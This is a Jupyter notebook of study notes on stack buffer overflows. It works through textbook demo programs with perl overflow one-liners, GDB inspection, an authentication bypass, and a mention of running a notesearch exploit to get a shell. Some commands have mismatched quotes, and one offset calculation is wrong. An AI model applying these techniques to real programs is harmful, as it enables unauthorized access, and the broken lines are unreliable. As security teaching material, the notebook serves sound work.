{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Buffer Overflows\n",
    "- most Internet worms use buffer overflow vulnerabilities to propagate\n",
    "- C and C++ are high level programming languages, but they still assume that programmers responsible for data integrity\n",
    "- modern compilers and Operating systems provide various protections making it harder to exploit overflows\n",
    "- once the buffer is allocated, there's no built-in mechanism to safeguard the amount of data that can be stored into to\n",
    "    - this is called buffer overrun or buffer overflow\n",
    "    - user data may overwrite other part of the memory it's not supposed to making the program behave differently or crashing the program\n",
    "    - hackers could take advantage of this flaw to control the program and may pawn the system by executing shellcode or payload of their choice"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Stack Overflow\n",
    "- overrun in stack segment\n",
    "\n",
    "### some demo programs that demonstrate stack overflows\n",
    "\n",
    "### overwrite variable values with the data of your choice\n",
    "1. booksrc/overflow_example.c\n",
    "- compile and run the program with some arguments\n",
    "    - ./overflow_example $(perl -e 'print \"A\"x15')\n",
    "    - ./overflow_example $(perl -e 'print \"A\"x16')\n",
    "- try to overwrite value of int value variable with \"BCDE\"\n",
    "- find the difference between the address of value and buffer_two\n",
    "    - perl -e 'print hex(0xbffff1dc-0xbffff1cc)' -> 22 bytes? should be 16\n",
    "    - `./overflow_example $(perl -e 'print \"A\"x16 . \"BCDE\"')`\n",
    "    - `./overflow_example $(perl -e 'print \"Ax16 . \"\\x45\\x44\\x43\\x42\")`"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### change the flow of the program\n",
    "#### authenticate without using actual password\n",
    "\n",
    "2. booksrc/auth_overflow.c\n",
    "- overrun the buffer to print \"Access Granted\" without providing actual password\n",
    "    - `./compile.sh auth_overflow_c auth_overflow`\n",
    "    - `./auth_overflow $(perl -e 'print \"A\"x20')`\n",
    "    \n",
    "- run the program in GDB to see the value of auth_flag\n",
    "    - ./gdb -q auth_overflow\n",
    "    - break main\n",
    "    - break check_authentication\n",
    "    - run $(perl -e 'print \"A\"x20')\n",
    "    - x/s password_buffer\n",
    "    - x/x &auth_flag"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### can you overflow if the variable declaration orders are switched?\n",
    "#### overwrite the return address to authenticate? doesn't work on newer system (tested on Kali (4-19-0)!\n",
    "3. booksrc/authoverflow2.c\n",
    "- see in gdb where auth_flag is compared to password_buffer\n",
    "- turns out auth_flag is still at higher address (pushed before) compared to password_buffer\n",
    "- address with As"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### notesearch has buffer overflow vulnerability\n",
    "- booksrc/notesearch.c\n",
    "\n",
    "- compile.sh notesearch.c notesearch\n",
    "- `./notesearch $(perl -e 'print '\"A\"x60')`\n",
    "\n",
    "### exploit_notesearch.c is the complete exploit program that exploits notesearch\n",
    "- ./compile.sh exploit_notesearch.c exploit_notesearch.exe\n",
    "- ./exploit_notesearch.exe\n",
    "- run the provided exploit_notesearch.sh script to determine the offset\n",
    "    - change the range if you still do not get the shell"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
